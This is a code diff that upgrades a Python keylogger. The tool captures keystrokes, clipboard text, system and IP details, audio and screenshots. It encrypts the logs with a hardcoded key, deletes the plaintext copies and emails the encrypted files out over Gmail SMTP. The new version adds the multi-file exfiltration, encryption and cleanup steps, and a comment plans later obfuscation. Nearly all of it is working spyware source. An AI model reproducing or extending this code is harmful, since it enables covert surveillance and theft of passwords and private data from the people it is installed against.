@@ -6,6 +6,7 @@ import os
 import getpass
 import sounddevice as sd
 import smtplib
+import threading
 from pynput.keyboard import Key, Listener
 from scipy.io.wavfile import write 
 from cryptography.fernet import Fernet
@@ -25,69 +26,69 @@ system_information = "system.txt"
 clipboard_information = "clipboard.txt"
 screenshot_information = "screenshot.png"
 audio_file = "audio.wav"
-file_path = "C:\\Users\\1337\\Desktop\\Pypros 20\\kl"
+file_path = "C:\\Users\\1337\\Desktop\\Pypros 20\\kl v2"
 extend = "\\"
+file_merg = file_path + extend
 
-# how long will each iteration last in seconds ( 3 iterations of 15 seconds here)
-time_iteration = 15 
-number_of_iterations_end = 3 
+
+#obfuscate this later
+e_keys_information = "e_log.txt"
+e_system_information = "e_system.txt"
+e_clipboard_information = "e_clipboard.txt"
+
 
 toaddr = os.getenv("toaddr")
 fromaddr = os.getenv("fromaddr")
 password = os.getenv("password")
 
+key = "tDUvhqGGXBC1MnwoH5fR2H1sPpWhwdbc_RjZDiShODo="
 
 
+def send_mail(filenames, attachments):
+    msg = MIMEMultipart()
 
+    msg['From'] = fromaddr
+    msg['To'] = toaddr
+    msg['Subject'] = 'Log Test'
 
-def send_mail(filename, attachment, toaddr):
+    # body of the email
+    body = "Body_of_the_mail"
+    msg.attach(MIMEText(body, 'plain'))
 
-	msg = MIMEMultipart()
+    # iterate over the attachments
+    for filename, attachment in zip(filenames, attachments):
+        # attachment
+        attachment_file = open(attachment, 'rb')
 
-	msg['From'] = fromaddr
-	msg['To'] = toaddr
-	msg['Subject'] = 'Log Test'
+        # base
+        p = MIMEBase('application', 'octet-stream')
 
-	# body of the email
-	body = "Body_of_the_mail"
-	msg.attach(MIMEText(body, 'plain'))
+        # encode msg
+        p.set_payload((attachment_file).read())
+        encoders.encode_base64(p)
 
-	# attachment
-	filename = filename
-	attachment = open(attachment, 'rb')
+        # add header
+        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
 
-	# base
-	p = MIMEBase('application', 'octet-stream')
+        msg.attach(p)
 
-	# ecnode msg
-	p.set_payload((attachment).read())
-	encoders.encode_base64(p)
+    # create smtp session
+    s = smtplib.SMTP('smtp.gmail.com', 587)
 
-	# add header
-	p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+    # start tls & login to gmail
+    s.starttls()
 
-	msg.attach(p)
+    s.login(fromaddr, password)
 
-	# create smtp session
-	s = smtplib.SMTP('smtp.gmail.com', 587)
+    text = msg.as_string()
 
-	# start tls & login to gmail
-	s.starttls()
+    s.sendmail(fromaddr, toaddr, text)
 
-	s.login(fromaddr, password)
-
-	text = msg.as_string()
-
-	s.sendmail(fromaddr, toaddr, text)
-
-	s.quit()
-
-# test the email func
-# send_mail(keys_information, file_path + extend + keys_information, toaddr)
+    s.quit()
 
 
 def sys_info():
-	with open(file_path + extend + system_information, "a") as f:
+	with open(file_path + extend + system_information, "a+") as f:
 		hostname = socket.gethostname()
 		private_ip = socket.gethostbyname(hostname)
 		try:
@@ -101,24 +102,19 @@ def sys_info():
 		f.write("Hostname: " + hostname + "\n")
 		f.write("Public IP: " + public_ip + "\n")
 		f.write("Private IP: " + private_ip + "\n")
-
-# test sys_info() func
-# sys_info()
+		f.close()
 
 
 def get_clipboard():
-	with open(file_path + extend + clipboard_information, "a") as f:
+	with open(file_path + extend + clipboard_information, "a+") as f:
 		# only works on copied text/string (no images, video, etc.)
 		try:
 			win32clipboard.OpenClipboard()
 			copied_data = win32clipboard.GetClipboardData()
 			win32clipboard.CloseClipboard()
-			f.write("Copied data: " + "\n" + copied_data + "\n")
+			f.write("[COPIED]" + "\n" + copied_data + "\n")
 		except:
 			f.write("Clipboard data unreadable!")
-
-# test get_clipboard() fun
-# get_clipboard()
 
 
 def record_voice():
@@ -132,75 +128,91 @@ def record_voice():
 
 	write(file_path + extend + audio_file, fs, myrecording)
 
-# testing record_voice() func
-# record_voice()
-# won't capture keystrokes while recording
-
 
 def screenshot():
 	image = ImageGrab.grab()
 	image.save(file_path + extend + screenshot_information)
 
 
-# base value for the counter (time)
-number_of_iterations = 0
+#crating a list of file names and attachments paths for send_mail()
+filenames = [e_keys_information, e_system_information, e_clipboard_information]
+attachments = [file_merg + e_keys_information, file_merg + e_system_information, file_merg + e_clipboard_information]
+
+
 current_time = time.time()
-stop_time = time.time() + time_iteration
+stop_time = time.time() + 15
 
-while number_of_iterations < number_of_iterations_end:
+count = 0
+keys = []
 
-	count = 0
-	keys = []
+def on_press(key):
+	global keys, count, current_time
 
-	def on_press(key):
-		global keys, count, current_time
+	print(key)
+	keys.append(key)
+	count += 1
+	current_time = time.time()
 
-		print(key)
-		keys.append(key)
-		count += 1
-		current_time = time.time()
+	if count >= 1:
+		count = 0
+		write_file(keys)
+		keys = []
 
-		if count >= 1:
-			count = 0
-			write_file(keys)
-			keys = []
+def write_file(keys):
+	with open(file_path + extend + keys_information, "a+") as f:
+		# numpad keys are encoded! 
+		for key in keys:
+			k = str(key).replace("'", "")
+			if k.find("space") > 0:
+				f.write("\n")
+				f.close()
 
-	def write_file(keys):
-		with open(file_path + extend + keys_information, "a") as f:
-			# numpad keys are encoded! 
-			for key in keys:
-				k = str(key).replace("'", "")
-				if k.find("space") > 0:
-					f.write("\n")
-					f.close()
+			elif k.find("Key") == -1:
+				f.write(k)
+				f.close()
 
-				elif k.find("Key") == -1:
-					f.write(k)
-					f.close()
+def encrypt_files():
+	files_to_encrypt = [file_merg + system_information, file_merg + clipboard_information, file_merg + keys_information]
+	encrypted_files = [file_merg + e_system_information, file_merg + e_clipboard_information, file_merg + e_keys_information]
+	count = 0 
 
-	def on_release(key):
-		if key == Key.esc:
-			return False
-		if current_time > stop_time:
-			return False
+	for i in files_to_encrypt:
+		with open(files_to_encrypt[count], 'rb') as f:
+			data = f.read()
 
-	with Listener(on_press=on_press, on_release=on_release) as listener:
-		listener.join()
+		fernet = Fernet(key)
+		encrypted = fernet.encrypt(data)
 
-	if current_time > stop_time:
+		with open(encrypted_files[count], 'wb') as f:
+			f.write(encrypted)
 
-		# clear old logs for new logs to be clean
-		with open(file_path + extend + keys_information, "w") as f:
-			f.write(" ")
+		count +=1
 
-		screenshot()
-		
-		#if the filename is anything other than screenshot_information , it is sent as binary!
-		send_mail(screenshot_information, file_path + extend + screenshot_information, toaddr)
 
-		get_clipboard()
+def delete_files():
+	files_to_delete = [system_information, clipboard_information, keys_information]
 
-		number_of_iterations += 1 
+	for file in files_to_delete:
+		os.remove(file_merg + file)
 
-		current_time = time.time()
-		stop_time = time.time() + time_iteration
+
+
+def test_func():
+	sys_info()
+	get_clipboard()
+	encrypt_files()
+	delete_files()
+	send_mail(filenames, attachments)
+
+
+def on_release(key):
+	if key == Key.esc:
+		return False
+	elif current_time > stop_time:
+		test_func()
+		return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+	listener.join()
+
